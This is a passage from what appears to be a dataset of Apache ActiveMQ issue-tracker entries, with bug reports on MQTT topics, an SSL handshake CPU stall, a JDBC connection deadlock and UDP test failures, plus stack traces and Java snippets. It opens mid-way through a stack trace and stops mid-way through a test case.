org.apache.jasper.compiler.DefaultErrorHandler.javacError(DefaultErrorHandler.java:123)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.ErrorDispatcher.javacError(ErrorDispatcher.java:296)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Compiler.generateClass(Compiler.java:376)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Compiler.compile(Compiler.java:437)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:608)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:261)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:683)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.TagFileProcessor.access$000(TagFileProcessor.java:88)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:739)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1501)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2291)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2341)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:743)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1501)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2291)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2341)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:743)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1501)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2291)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2341)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2347)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Root.accept(Node.java:498)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2291)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:757)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:222)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.compiler.Compiler.compile(Compiler.java:435)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:608)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:360)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)&#91;jsp-2.1-glassfish-2.1.v20100127.jar:&#93;        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)&#91;geronimo-servlet_2.5_spec-1.2.jar:1.2&#93;        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1320)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)&#91;spring-web-3.2.8.RELEASE.jar:3.2.8.RELEASE&#93;        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)&#91;spring-web-3.2.8.RELEASE.jar:3.2.8.RELEASE&#93;        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)&#91;activemq-web-5.10.0.jar:5.10.0&#93;        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)file:/opt/activemq-5.10.0/webapps/admin/WEB-INF/classes/:        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:443)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:521)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:227)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1044)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:372)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:189)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:978)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:154)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:521)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:154)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.Server.handle(Server.java:367)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:486)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:926)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:988)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:640)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:628)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)&#91;jetty-all-server-7.6.9.v20130131.jar:7.6.9.v20130131&#93;        at java.lang.Thread.run(Thread.java:745)&#91;:1.8.0_11&#93;
issueID:AMQ-5365
type:Bug
changed files:
texts:MQTT topic name in received message is wrong in network of brokers scenario
Setup:Broker1 and Broker2 are networked using a duplex connection.<Broker1> -------------- <Broker2>Transport connector of Broker1:-----------------------------------------<transportConnector name="mqtt"uri="mqtt://0.0.0.0:1883?maximumConnections=1000&wireFormat.maxFrameSize=104857600&transport.subscriptionStrategy=mqtt-virtual-topic-subscriptions”/>Transport connector of Broker2:-----------------------------------------<transportConnector name="mqtt"uri="mqtt://0.0.0.0:2883?maximumConnections=1000&wireFormat.maxFrameSize=104857600&transport.subscriptionStrategy=mqtt-virtual-topic-subscriptions”/>Problem:In a network of brokers scenario with MQTT clients, sometimes the topic that is reported (to the clients) when the message is received has extra information prefixed to what the consumer subscribed to. For example, if the consumer received a message on topic dup/msg/test, it is received as:Consumer/duptestsub:AT_LEAST_ONCE/VirtualTopic/dup/msg/tes
issueID:AMQ-5366
type:Task
changed files:
texts:Upgrade to Camel 2.14
Camel 2.14 is released.
issueID:AMQ-5368
type:Bug
changed files:
texts:SSL handshake stalls broker with NIO
using NIOSSL transport, SSL handshakes for ~5000 connections easily stall a broker taking 100% CPUI"m using version ActiveMQ 5.8, but it occurs on 5.9, 5.10 versions as welldoing some profiling, it showed up that the SSL handshake on broker side eats up ~90% of overall CPU timeby checking just the handshake status in very high frequencytop 3 methods sorted by own processor time:com.sun.net.ssl.internal.ssl.SSLEngineImpl.getHandshakeStatus()org.apache.activemq.transport.nio.NIOSSLTransport.doHandshake()com.sun.net.ssl.internal.ssl.SSLEngineImpl.getHSStatus(javax.net.ssl.SSLEngineResult$HandshakeStatus)the reason is the asynchronous nature of the SSL handshake with NIO, especially the execution of delegated tasks: NIOSSLTransport.doHandshake() executes delegated tasks using a TaskRunnerFactory asynchronously in the meantime it loops calling SSLEngine.getHandshakeStatus()to improve the situation I did the following changes: run delegated tasks synchronously in method doHandshake (handshake status NEED_TASK) instead of asynchronously added some small wait cycles in method secureRead as there is not always data available with NIO (to further reduce the number of calls to SSLEngine.getHandshakeStatus)after these changes the SSL handshake for several thousand connections in parallel was not a problem anymore
issueID:AMQ-5371
type:Improvement
changed files:
texts:ignoreNetworkConsumers should be available in AbortSlowConsumerStrategy
When AbortSlowAckConsumerStrategy.ignoreNetworkConsumers was introduced in https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=77bcffc9, its placement in AbortSlowAckConsumerStrategy means it can"t be used with AbortSlowConsumerStrategy.  Without it, abortConnection="true" causes the broker-to-broker network connectors to be aborted but not re-established, as described in http://irclogs.dankulp.com/logs/irclogger_log/activemq?date=2013-09-16,Mon&text=off, http://activemq.2283324.n4.nabble.com/Dropping-slow-consumers-td4671468.html, and http://activemq.2283324.n4.nabble.com/abortConnection-quot-true-quot-td4685674.html.AbortSlowConsumerStrategy would benefit from being able to use this flag, so it should be moved up, and the AbortSlowConsumerStrategy code should be updated to use it, and to allow it to be set via the XML config.
issueID:AMQ-5372
type:Bug
changed files:
texts:UdpTransportTests fail with JDK8 in teardown
UdpTransportTest and UdpTransportUsingServerTest both fail on teardown() with the first stack trace on the call to producer.stop().   UpdTransportBindTest fails in a similar fashion on a call to broker.stop, shown in the second stack trace.The problem is not just that these tests fail, but that it leaves a process running using port 61616, so subsequent tests fail.  To avoid that I will handle the exception in EmbeddedBrokerTestSupport.tearDown() and UdpTestSupport.tearDown()java.io.IOException: No such file or directory at sun.nio.ch.NativeThread.signal(Native Method) at sun.nio.ch.DatagramChannelImpl.implCloseSelectableChannel(DatagramChannelImpl.java:1012) at java.nio.channels.spi.AbstractSelectableChannel.implCloseChannel(AbstractSelectableChannel.java:234) at java.nio.channels.spi.AbstractInterruptibleChannel.close(AbstractInterruptibleChannel.java:115) at org.apache.activemq.transport.udp.UdpTransport.doStop(UdpTransport.java:424) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.transport.AbstractInactivityMonitor.stop(AbstractInactivityMonitor.java:145) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.CommandJoiner.stop(CommandJoiner.java:81) at org.apache.activemq.transport.udp.UdpTestSupport.tearDown(UdpTestSupport.java:185) at junit.framework.TestCase.runBare(TestCase.java:146) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)java.io.IOException: No such file or directory at sun.nio.ch.NativeThread.signal(Native Method) at sun.nio.ch.DatagramChannelImpl.implCloseSelectableChannel(DatagramChannelImpl.java:1012) at java.nio.channels.spi.AbstractSelectableChannel.implCloseChannel(AbstractSelectableChannel.java:234) at java.nio.channels.spi.AbstractInterruptibleChannel.close(AbstractInterruptibleChannel.java:115) at org.apache.activemq.transport.udp.UdpTransport.doStop(UdpTransport.java:424) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.transport.AbstractInactivityMonitor.stop(AbstractInactivityMonitor.java:145) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.CommandJoiner.stop(CommandJoiner.java:81) at org.apache.activemq.transport.udp.UdpTransportServer.doStop(UdpTransportServer.java:109) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:280) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:2106) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:762) at org.apache.activemq.EmbeddedBrokerTestSupport.tearDown(EmbeddedBrokerTestSupport.java:61) at junit.framework.TestCase.runBare(TestCase.java:146) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)
issueID:AMQ-5373
type:Test
changed files:
texts:SimpleAMQPAuthTest uses the default AMQP port, clashing with existing running brokers
SimpleAMQPAuthTest uses the default AMQP port (5672) when starting its broker, which means it isnt possible to successfully run the tests when on a box with an existing AMQP broker listening on the default port.It would be good if a different port was used as the other tests do, to reduce the chance of this happening.
issueID:AMQ-5377
type:Bug
changed files:
texts:Incorrect wild card replacement in mqtt topics
There"s no proper conversion from ActiveMQ specific to MQTT wildcards when messages is sent back to the wire. At the moment only "." is handled.
issueID:AMQ-5378
type:Improvement
changed files:
texts:refactoring and simple testsuite for unix init script
Major rework for the init script and a simple testsuite to test the proper function on unix platforms.Originally i submitted the current unix init script (see AMQ-2453) - over the time the original script seems to be modified in a way which breaks the "setup" function.If you call "./activemq setup ~/.activemq" you get a really messy configfile.The current distribution also contains lots of files of the java service wrapper which are not needed anymore.
issueID:AMQ-5379
type:Bug
changed files:AmqpTransportFilter.java
AMQPProtocolDiscriminator.java
IAmqpProtocolConverter.java
AmqpProtocolConverter.java
texts:AMQP - allow setting prefetch size
Currently the prefetch size is hardcoded to the value of 100
issueID:AMQ-5381
type:Bug
changed files:
texts:ActiveMQBytesMessage mishandles restoration of old message contents
Changes made in ActiveMQ 5.9.1, AMQ-4887, [cb5c29d02d02dc7f7fa4f5c1a97bd2a59078bccd introduced a bug in ActiveMQBytesMessage which results in a java.util.zip.ZipException: incorrect header check being thrown at org.apache.activemq.command.ActiveMQBytesMessage.restoreOldContent(ActiveMQBytesMessage.java:883) when a consumer attempts to reuse a received ActiveMQBytesMessage.This bug is triggered under a unique set of circumstances: A message is published by a JMS client with compression disabled on its ActiveMQConnection The message is consumed by a JMS client with compression enabled on its ActiveMQConnection The JMS consumer makes the received message writable in order to modify and reuse it:message.setReadOnlyProperties(false);message.setReadOnlyBody(false); The JMS consumer modifies the message, triggering a call to ActiveMQBytesMessage.initializeWriting()The problem within ActiveMQBytesMessage.initializeWriting() is that the method determines whether the message should be compressed when it is published (based on its current connection) BEFORE it has restored the message"s original content.  In the example above, the message"s original compressed flag is changed from false to true, resulting in restoreOldContent() trying to decompress message contents which were never compressed.private void initializeWriting() throws JMSException {        checkReadOnlyBody();        if (this.dataOut == null) {            this.bytesOut = new ByteArrayOutputStream();            OutputStream os = bytesOut;            this.dataOut = new DataOutputStream(os);        }        // should compression be used when publishing this message??        ActiveMQConnection connection = getConnection();        if (connection != null && connection.isUseCompression()) {            compressed = true;        }        // restore the message"s old content        restoreOldContent();}A simple solution would be to move the restoreOldContent() method call before the connection.isUseCompression() conditional in ActiveMQBytesMessage.initializeWriting().Had a chance to look into this problem further.  The best fix would be to only set the "compressed" flag when the message"s "contents" are stored, instead of whenever the message is initialized for writing.
issueID:AMQ-5384
type:Bug
changed files:JDBCMessageStore.java
JDBCPersistenceAdapter.java
texts:Deadlock on DB connections in JDBCMessageStore.removeMessage
AMQ 5.9 gets stuck under 30-50 req/second load when using JDBC persistence - this affects our application as it hangs during performance testing (this happens almost every night).Following stacktraces indicate that there"s a deadlock on DB connection:Stack logged by C3P0, showing when first DB connection has been picked from the pool:2014-10-06 08:44:40,646 | INFO  | Logging the stack trace by which the overdue resource was checked-out. | com.mchange.v2.resourcepool.BasicResourcePool | C3P0PooledConnectionPoolManager[identityToken->2x1e6s941raztn6mju110java.lang.Exception: DEBUG STACK TRACE: Overdue resource check-out stack trace.        at com.mchange.v2.resourcepool.BasicResourcePool.checkoutResource(BasicResourcePool.java:555)        at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutAndMarkConnectionInUse(C3P0PooledConnectionPool.java:756)        at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:683)        at com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource.getConnection(AbstractPoolBackedDataSource.java:140)        at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58)        at org.apache.activemq.store.jdbc.TransactionContext.begin(TransactionContext.java:163)        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.beginTransaction(JDBCPersistenceAdapter.java:510)        at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:92)        at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:259)        at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:85)        at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:75)        at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:253)        at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:112)        at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:433)        at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)        at java.lang.Thread.run(Thread.java:662)Following stack shows the same thread pending for second DB connection (without releasing the first one):"ActiveMQ Transport: tcp:///10.132.7.20:36431@5445" daemon prio=10 tid=0x000000004119d000 nid=0x61bf in Object.wait() [0x00007f41120d7000]   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on <0x00000000fabdd2c0> (a com.mchange.v2.resourcepool.BasicResourcePool) at com.mchange.v2.resourcepool.BasicResourcePool.awaitAvailable(BasicResourcePool.java:1414) at com.mchange.v2.resourcepool.BasicResourcePool.prelimCheckoutResource(BasicResourcePool.java:606) - locked <0x00000000fabdd2c0> (a com.mchange.v2.resourcepool.BasicResourcePool) at com.mchange.v2.resourcepool.BasicResourcePool.checkoutResource(BasicResourcePool.java:526) at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutAndMarkConnectionInUse(C3P0PooledConnectionPool.java:756) at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:683) at com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource.getConnection(AbstractPoolBackedDataSource.java:140) at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58) at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.getStoreSequenceId(DefaultJDBCAdapter.java:290) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getStoreSequenceIdForMessageId(JDBCPersistenceAdapter.java:840) at org.apache.activemq.store.jdbc.JDBCMessageStore.removeMessage(JDBCMessageStore.java:194) at org.apache.activemq.store.memory.MemoryTransactionStore$4.run(MemoryTransactionStore.java:348) at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:103) at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:259) at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:85) at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:69) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:253) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:112) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:424) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:662) Problem seems to be related with JDBCMessageStore.removeMessage method:    public void removeMessage(ConnectionContext context, MessageAck ack) throws IOException {     long seq = persistenceAdapter.getStoreSequenceIdForMessageId(ack.getLastMessageId(), destination)[0];...Call to removeMessage already has one DB connection passed in context method parameter, but calling persistenceAdapter.getStoreSequenceIdForMessageId creates another DB connection in the same transaction.Deadlock occurs when all DB connections are used by context, so that  removeMessage can"t fetch its own connection.Possible solution would be to pass ConnectionContext object to persistenceAdapter.getStoreSequenceIdForMessageId method, so that the method would reuse same connection.
issueID:AMQ-5385
type:Bug
changed files:
texts:MQTT Link Stealing fails when client reconnects more than once
Modified existing JUnit test case to re-connect with the same clientid a second time. Existing Test case tried once, which succeeded.When client reconnects the second time (third connection attempt with the same clientid), link stealing does not happen.Following is the modified test case.    @Test(timeout = 60 * 1000)    public void testDuplicateClientId() throws Exception {        // test link stealing enabled by default        final String clientId = "duplicateClient";        MQTT mqtt = createMQTTConnection(clientId, false);        mqtt.setKeepAlive((short) 2);        final BlockingConnection connection = mqtt.blockingConnection();        connection.connect();        final String TOPICA = "TopicA";        connection.publish(TOPICA, TOPICA.getBytes(), QoS.EXACTLY_ONCE, true);         MQTT mqtt1 = createMQTTConnection(clientId, false);        mqtt1.setKeepAlive((short) 2);        final BlockingConnection connection1 = mqtt1.blockingConnection();        connection1.connect();         assertTrue("Duplicate client disconnected", Wait.waitFor(new Wait.Condition() {            @Override            public boolean isSatisified() throws Exception {                return connection1.isConnected();            }        }));         assertTrue("Old client still connected", Wait.waitFor(new Wait.Condition() {            @Override            public boolean isSatisified() throws Exception {                return !connection.isConnected();            }        }));         MQTT mqtt2 = createMQTTConnection(clientId, false);        mqtt2.setKeepAlive((short) 2);        final BlockingConnection connection4 = mqtt2.blockingConnection();        connection4.connect();         assertTrue("Old client still connected", Wait.waitFor(new Wait.Condition() {            @Override            public boolean isSatisified() throws Exception {                return !connection1.isConnected();            }        }));               assertTrue("Duplicate client disconnected", Wait.waitFor(new Wait.Condition() {            @Override            public boolean isSatisified() throws Exception {                return connection4.isConnected();            }        }));         connection4.disconnect();}
issueID:AMQ-5389
type:Bug
changed files:MQTTCodec.java
texts:MQTTCodec headerParser - not reducing readSize if nulls are read
in the header read you"ll notice that if 0"s are read, i increases to protect the end of buffer, but when you pass this down to the next parser the size of the buffer passed is readSize-1 not readSize-iAs well there is a check for readsize > 1.. this should be (readsize-i > 1)@Override        public void parse(DataByteArrayInputStream data, int readSize) throws IOException {            int i = 0;            while (i++ < readSize) {                byte b = data.readByte();                // skip repeating nulls                if (b == 0) {                    continue;                }                header = b;                currentParser = initializeVariableLengthParser();                // if (readSize > 1) {                //     currentParser.parse(data, readSize - 1);                if (readSize-i > 1) {                    currentParser.parse(data, readSize - i);                }                return;            }        }
issueID:AMQ-5390
type:Bug
changed files:
texts:MQTT pending durable subscriber messages are not delievered after broker restart
If there are pending messages to be delivered to a subscriber and if the broker is restarted at this point, the pending messages are not delivered to the subscriber when it connects after broker restart.I modified existing test case testReceiveMessageSentWhileOffline() and added test case testReceiveMessageSentWhileOfflineAndBrokerRestart() shown below:changes: use standalone broker as I was not sure if embedded broker persists messages on permanent store. manually need to restart when test prompts to restart broker@Test(timeout = 60 * 1000)    public void testReceiveMessageSentWhileOfflineAndBrokerRestart() throws Exception {        final byte[] payload = new byte[1024 * 32];        for (int i = 0; i < payload.length; i++) {            payload[i] = "2";        }        int numberOfRuns = 100;        int messagesPerRun = 2;        final MQTT mqttPub = createMQTTConnection("MQTT-Pub-Client", true);        final MQTT mqttSub = createMQTTConnection("MQTT-Sub-Client", false);        mqttPub.setHost("tcp://localhost:1883");        mqttSub.setHost("tcp://localhost:1883");        final BlockingConnection connectionPub = mqttPub.blockingConnection();        